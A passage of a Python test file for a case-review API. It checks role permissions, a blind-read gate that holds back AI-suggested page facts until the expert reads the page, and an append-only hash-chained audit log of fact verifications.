    assert (await client.put(url, json={"text": "ok", "relevance": CANARY})).status_code == 422


async def test_r_o_7_no_response_model_that_shows_a_page_carries_suggestions() -> None:
    forbidden = {"facts", "value", "suggestions", "lines", "word_ids", "text"}
    assert not forbidden & set(PageDetail.model_fields)
    assert not {"facts", "value", "suggestions", "word_ids"} & set(TranscriptEntryOut.model_fields)


# --- R-I: integrity across sources (the stub facts on page 118) ---


@pytest.fixture
async def fworld(seed: Seed, aconn: psycopg.AsyncConnection, crypto: CaseCrypto, client_for: Any) -> dict[str, Any]:
    expert, assistant, viewer, co_expert, supervisor, stranger, org_admin = (seed.person() for _ in range(7))
    case = seed.case(
        seed.org(kind="team", members={expert: "owner", org_admin: "admin"}),
        expert,
        status="active",
        packs=LAUNCH.case_row(),
    )
    for person, role in (
        (assistant, "assistant"),
        (viewer, "viewer"),
        (co_expert, "co_expert"),
        (supervisor, "supervisor"),
    ):
        seed.case_member(case, person, role, added_by=expert)
    seed.case(seed.org(members={stranger: "owner"}), stranger, status="active")
    loaded = await load_stub_facts(aconn, case, pages=[118, 119], crypto=crypto)
    return {
        "case": case,
        "expert": expert,
        "assistant": assistant,
        "viewer": viewer,
        "co_expert": co_expert,
        "supervisor": supervisor,
        "stranger": stranger,
        "org_admin": org_admin,
        "page_id": loaded[118].page_id,
        "client": await client_for(expert),
    }


def base(w: dict[str, Any]) -> str:
    return f"/v1/cases/{w['case']}"


async def read_page(client: httpx.AsyncClient, w: dict[str, Any], n: int = 118) -> None:
    assert (await client.post(f"{base(w)}/pages/{n}/read", json={"dwell_seconds": 20})).status_code == 200


async def page_facts(client: httpx.AsyncClient, w: dict[str, Any], n: int = 118) -> list[dict[str, Any]]:
    resp = await client.get(f"{base(w)}/pages/{n}/facts")
    assert resp.status_code == 200, resp.text
    return resp.json()["facts"]  # type: ignore[no-any-return]


async def act(
    client: httpx.AsyncClient, w: dict[str, Any], fact: dict[str, Any], what: str = "verify", **body: Any
) -> httpx.Response:
    return await client.post(
        f"{base(w)}/facts/{fact['id']}/{what}", json=body, headers={"if-match": etag(fact["version"])}
    )


def log_rows(admin: psycopg.Connection, fact_id: str) -> list[tuple[Any, ...]]:
    return admin.execute(
        "select action, person_id, old_value, new_value from app.fact_verifications where fact_id = %s order by seq",
        (fact_id,),
    ).fetchall()


async def test_r_i_1_the_client_can_tell_suggested_checked_changed_and_rejected_facts_apart(
    admin: psycopg.Connection, fworld: dict[str, Any]
) -> None:
    client = fworld["client"]
    await read_page(client, fworld)
    facts = await page_facts(client, fworld)
    assert len(facts) >= 3 and {f["status"] for f in facts} == {"suggested"}
    assert all(f["word_ids"] for f in facts), "every suggestion names the OCR words it rests on"
    fact_a, fact_b, fact_c = facts[:3]
    assert (await act(client, fworld, fact_a, action="correct")).json()["status"] == "verified"
    changed = await act(client, fworld, fact_b, action="edit", new_value=fact_b["value"] + " ")
    assert changed.status_code == 200 and changed.json()["status"] == "edited"
    assert (await act(client, fworld, fact_c, action="not_right")).json()["status"] == "rejected"
    now = {f["id"]: f["status"] for f in await page_facts(client, fworld)}
    assert [now[f["id"]] for f in (fact_a, fact_b, fact_c)] == ["verified", "edited", "rejected"]
    assert [log_rows(admin, f["id"])[0][0] for f in (fact_a, fact_b, fact_c)] == ["correct", "edit", "not_right"]


async def test_r_i_2_a_checked_fact_names_who_checked_it_and_when(fworld: dict[str, Any]) -> None:
    client = fworld["client"]
    await read_page(client, fworld)
    fact = (await page_facts(client, fworld))[0]
    checked = (await act(client, fworld, fact, action="correct")).json()
    assert {"verified_by", "checked_by"} & set(checked) and {"verified_at", "checked_at"} & set(checked), sorted(
        checked
    )


async def test_r_i_3_an_edit_keeps_the_original_value_in_an_unbroken_hash_chain(
    admin: psycopg.Connection, fworld: dict[str, Any]
) -> None:
    client = fworld["client"]
    await read_page(client, fworld)
    fact = (await page_facts(client, fworld))[0]
    original = fact["value"]
    first = await act(client, fworld, fact, action="edit", new_value=original + " ")
    assert first.status_code == 200
    second = await act(client, fworld, first.json(), action="edit", new_value=original + "  ")
    assert second.status_code == 200
    rows = log_rows(admin, fact["id"])
    assert [r[0] for r in rows] == ["edit", "edit"]
    assert rows[0][2] == original and rows[0][3] == original + " ", "the machine's value is kept on the first edit"
    assert rows[1][2] == original + " ", "and each later value is kept in turn"
    assert all(r[1] == fworld["expert"] for r in rows)
    chain = admin.execute(
        "select seq, prev_hash, hash from app.fact_verifications where case_id = %s order by seq", (fworld["case"],)
    ).fetchall()
    assert chain[0][1] == "0" * 64 and chain[1][1] == chain[0][2]
    assert admin.execute("select app.fact_verifications_chain_ok(%s)", (fworld["case"],)).fetchone() == (True,)
    with pytest.raises(psycopg.DatabaseError, match="append-only"):  # control: a past row cannot be changed
        admin.execute("update app.fact_verifications set old_value = 'x' where case_id = %s", (fworld["case"],))
    with pytest.raises(psycopg.DatabaseError, match="append-only"):
        admin.execute("delete from app.fact_verifications where case_id = %s", (fworld["case"],))


async def test_r_i_4_only_the_named_expert_verifies(
    client_for: Any, admin: psycopg.Connection, fworld: dict[str, Any]
) -> None:
    client = fworld["client"]
    await read_page(client, fworld)
    fact = (await page_facts(client, fworld))[0]
    for who in ("assistant", "viewer", "co_expert", "supervisor"):
        other = await client_for(fworld[who])
        if who in ("assistant", "co_expert", "supervisor"):
            await other.post(f"{base(fworld)}/pages/118/read", json={"dwell_seconds": 20})  # past the blind read
        for action in ("correct", "not_right", "edit"):
            denied = await act(other, fworld, fact, action=action, new_value=fact["value"] + " ")
            assert denied.status_code == 403, (who, action, denied.status_code)
    for who in ("stranger", "org_admin"):
        other = await client_for(fworld[who])
        assert (await act(other, fworld, fact, action="correct")).status_code in (403, 404), who
    assert log_rows(admin, fact["id"]) == []
    assert admin.execute("select status from app.facts where id = %s", (fact["id"],)).fetchone() == ("suggested",)
    assert (await act(client, fworld, fact, action="correct")).status_code == 200  # control: the named expert
    assert [r[0] for r in log_rows(admin, fact["id"])] == ["correct"]


async def test_r_i_5_every_route_that_returns_ai_output_about_a_page_is_423_until_the_page_is_read(
    client_for: Any, admin: psycopg.Connection, fworld: dict[str, Any]
) -> None:
    client = fworld["client"]
    fact = admin.execute(
        "select id, version, value from app.facts where page_id = %s limit 1", (fworld["page_id"],)
    ).fetchone()
    assert fact is not None
    stub = {"id": str(fact[0]), "version": fact[1]}
    calls: dict[str, Any] = {
        "facts": lambda c: c.get(f"{base(fworld)}/pages/118/facts"),
        "words": lambda c: c.get(f"{base(fworld)}/pages/118/words"),
        "verify_correct": lambda c: act(c, fworld, stub, action="correct"),
        "verify_edit": lambda c: act(c, fworld, stub, action="edit", new_value=str(fact[2]) + " "),
        "verify_not_right": lambda c: act(c, fworld, stub, action="not_right"),
        "move": lambda c: act(c, fworld, stub, "move", to_page_no=119, word_ids=["w1"]),
    }
    for name, call in calls.items():
        blocked = await call(client)
        assert blocked.status_code == 423 and blocked.json()["error"]["code"] == "blind_read", name
    assert admin.execute(
        "select count(*) from app.fact_verifications where case_id = %s", (fworld["case"],)
    ).fetchone() == (0,)
    assert admin.execute("select version from app.facts where id = %s", (fact[0],)).fetchone() == (fact[1],)

    assistant = await client_for(fworld["assistant"])  # someone else reading does not unlock it for the expert
    await read_page(assistant, fworld)
    assert (await client.get(f"{base(fworld)}/pages/118/facts")).status_code == 423

    await read_page(client, fworld)  # control: the expert's own read opens them
    assert (await client.get(f"{base(fworld)}/pages/118/facts")).status_code == 200
    assert (await client.get(f"{base(fworld)}/pages/118/words")).status_code == 200
    assert (await calls["verify_correct"](client)).status_code == 200


async def test_r_i_6_a_changed_value_must_be_found_in_the_cited_words(
    admin: psycopg.Connection, fworld: dict[str, Any]
) -> None:
    client = fworld["client"]
    await read_page(client, fworld)
    fact = (await page_facts(client, fworld))[0]
    refused = await act(client, fworld, fact, action="edit", new_value=f"not on the page {CANARY}")
    assert refused.status_code == 422
    assert log_rows(admin, fact["id"]) == []
    assert admin.execute("select status from app.facts where id = %s", (fact["id"],)).fetchone() == ("suggested",)
    ok = await act(client, fworld, fact, action="edit", new_value=fact["value"] + " ")  # control: a value that is there
    assert ok.status_code == 200 and ok.json()["status"] == "edited"


async def test_r_i_6b_a_fact_whose_value_is_not_in_its_cited_words_cannot_be_marked_correct(
    admin: psycopg.Connection, fworld: dict[str, Any]
) -> None:
    client = fworld["client"]
    await read_page(client, fworld)
    fact = (await page_facts(client, fworld))[0]
    admin.execute("update app.facts set value = %s where id = %s", (f"not on the page {CANARY}", fact["id"]))
    row = (await page_facts(client, fworld))[0]
    assert row["id"] == fact["id"] and CANARY in row["value"]
    refused = await act(client, fworld, row, action="correct")
    assert refused.status_code == 422, refused.status_code
    assert admin.execute("select status from app.facts where id = %s", (fact["id"],)).fetchone() == ("suggested",)
